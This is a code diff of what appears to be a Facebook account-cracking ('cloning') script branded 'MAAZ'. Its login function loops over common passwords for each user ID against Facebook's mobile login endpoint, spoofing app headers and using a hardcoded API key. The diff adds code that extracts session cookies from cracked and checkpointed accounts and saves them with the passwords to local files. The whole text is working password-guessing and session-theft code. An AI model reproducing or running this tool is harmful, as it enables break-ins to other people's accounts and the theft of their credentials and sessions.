@@ -724,15 +724,15 @@ def __Random_Method__():
 
 
 def login1(uid):
-    global oks,loop,cps
-    Session=requests.session()
+    global oks, loop, cps
+    Session = requests.session()
     try:
-        sys.stdout.write(f'\r\r\33[38;5;37m[\x1b[38;5;46mMAAZ\33[38;5;37m-\x1b[38;5;46mB1\33[38;5;37m]\033[1;97m-\33[38;5;37m[\033[1;97m{loop}\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46mOK\33[38;5;46m/\x1b[38;5;208mCP\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46m{len(oks)}\33[38;5;46m/\x1b[38;5;208m{len(cps)}\33[38;5;37m]')
+        sys.stdout.write(
+            f'\r\r\x1b[38;5;46m[\x1b[38;5;46mMaaz\x1b[38;5;46m-\x1b[38;5;46mB1\x1b[38;5;46m]\033[1;97m-\x1b[38;5;46m[\033[1;97m{loop}\x1b[38;5;46m]\033[1;97m-\x1b[38;5;46m[\x1b[38;5;46mOK\x1b[38;5;46m/\x1b[38;5;226mCP\x1b[38;5;46m]\033[1;97m-\x1b[38;5;46m[\x1b[38;5;46m{len(oks)}\x1b[38;5;46m/\x1b[38;5;46m{len(cps)}\x1b[38;5;46m]'
+        )
         sys.stdout.flush()
         ua = random.choice(ugen)
-		
-        # Original password list
-        for pw in ["123456","1234567","12345678","123456789","1234567890","786786","123123"]:        
+        for pw in ["123456","1234567","12345678","123456789","1234567890","123123"]:
             data = {'adid':str(uuid.uuid4()),
             'format': 'json',
             'device_id':str(uuid.uuid4()),
@@ -754,45 +754,43 @@ def login1(uid):
             'fb_api_req_friendly_name': 'authenticate', 
             'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 
             'api_key': '882a8490361da98702bf97a021ddc14d'}
-            
-            # Fast headers with random values for better success
             head = {'User-Agent': ua,
             'Content-Type': 'application/x-www-form-urlencoded', 
             'Host': 'graph.facebook.com', 
-            'X-FB-Net-HNI': str(random.randint(45001, 45999)),
-            'X-FB-SIM-HNI': str(random.randint(45001, 45999)),
+            'X-FB-Net-HNI': '25227',
+            'X-FB-SIM-HNI': '29752',
             'X-FB-Connection-Type': 'MOBILE.LTE', 
             'X-Tigon-Is-Retry': 'False', 
-            'x-fb-session-id': f'nid=jiZ+yNNBgbwC;pid=Main;tid={random.randint(100, 999)};nc=1;fc=0;bc=0;cid={uuid.uuid4().hex[:16]}', 
+            'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 
             'x-fb-device-group': '5120', 
             'X-FB-Friendly-Name': 'ViewerReactionsMutation', 
             'X-FB-Request-Analytics-Tags': 'graphservice', 
             'X-FB-HTTP-Engine': 'Liger', 
             'X-FB-Client-IP': 'True', 
             'X-FB-Server-Cluster': 'True', 
-            'x-fb-connection-token': uuid.uuid4().hex[:16]}
-            
+            'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62', 
+            'Content-Length': '706'}
             url = "https://b-graph.facebook.com/auth/login"
-            rp = Session.post(url, data=data, headers=head, allow_redirects=False, verify=True, timeout=8).json()
-            
-            # Success conditions
-            if "session_key" in rp or "access_token" in rp:            	
-                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mMaazm\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
-                open("/sdcard/Maaz-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
+            rp = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
+            if "session_key" in rp:
+                cookies = ";".join([f"{i['name']}={i['value']}" for i in rp.get('session_cookies', [])])
                 oks.append(uid)
+                open("/sdcard/MAAZ_CLONING-OK.txt", "a").write(uid + "|" + pw + "|" + cookies + "\n")
+                print(f'\r\033[38;5;46m[MAAZ-OK] {uid} ● {pw} ● COOKIE={cookies}\033[1;97m')
                 break
-            
-            # Checkpoint conditions  
-            elif "www.facebook.com" in str(rp) or "checkpoint" in str(rp):
-                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mMaaz\033[1;97m-\x1b[38;5;260mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked CP id,"')
-                open("/sdcard/Maaz-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
+
+            elif "www.facebook.com" in rp.get('error', {}).get('message', ''):
+                cookies = ";".join([f"{i.get('name')}={i.get('value')}" for i in rp.get('session_cookies', [])]) if "session_cookies" in rp else "NO-COOKIE"
                 cps.append(uid)
+                open("/sdcard/MAAZ_CLONING-OK.txt", "a").write(uid + "|" + pw + "|" + cookies + "\n")
+                print(f'\r\033[38;5;226m[MAAZ-CP] {uid} ● {pw} ● COOKIE={cookies}\033[1;97m')
                 break
-            
+
             else:
                 continue
-                    
-        loop+=1
+        loop += 1
     except Exception as e:
-        time.sleep(5)  # Fast exception handling            
-main()
+        time.sleep(5)
+
+if __name__ == "__main__":
+    main()
